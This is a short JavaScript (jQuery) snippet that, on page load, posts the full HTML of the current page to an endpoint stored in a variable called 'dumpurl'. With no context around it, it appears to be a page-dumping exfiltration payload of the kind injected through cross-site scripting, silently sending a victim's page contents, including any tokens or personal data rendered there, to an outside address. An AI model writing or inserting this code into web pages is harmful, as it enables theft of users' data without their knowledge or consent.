$(document).ready(function(){	
	$.post(dumpurl, { POSTDATA: $('html').html() } );
});